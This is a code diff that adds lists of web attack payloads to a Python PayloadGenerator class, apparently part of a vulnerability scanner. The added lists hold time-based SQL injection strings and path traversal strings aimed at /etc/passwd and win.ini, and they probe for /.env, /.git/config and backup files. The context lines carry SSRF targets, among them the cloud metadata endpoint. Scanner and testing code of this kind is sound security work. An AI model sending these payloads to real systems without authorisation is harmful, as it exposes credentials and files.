@@ -36,3 +36,28 @@ class PayloadGenerator:
             "http://localhost:5000/server-status",
             "http://169.254.169.254/latest/meta-data/"
         ]
+
+    @staticmethod
+    def get_time_sqli_payloads():
+        return [
+            "' AND SLEEP(5) --",
+            "1; WAITFOR DELAY '0:0:5'--",
+            "1' WAITFOR DELAY '0:0:5'--"
+        ]
+        
+    @staticmethod
+    def get_lfi_payloads():
+        return [
+            "../../../../../../../../etc/passwd",
+            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "C:\\Windows\\win.ini"
+        ]
+        
+    @staticmethod
+    def get_sensitive_files():
+        return [
+            "/.env",
+            "/.git/config",
+            "/phpinfo.php",
+            "/backup.zip"
+        ]
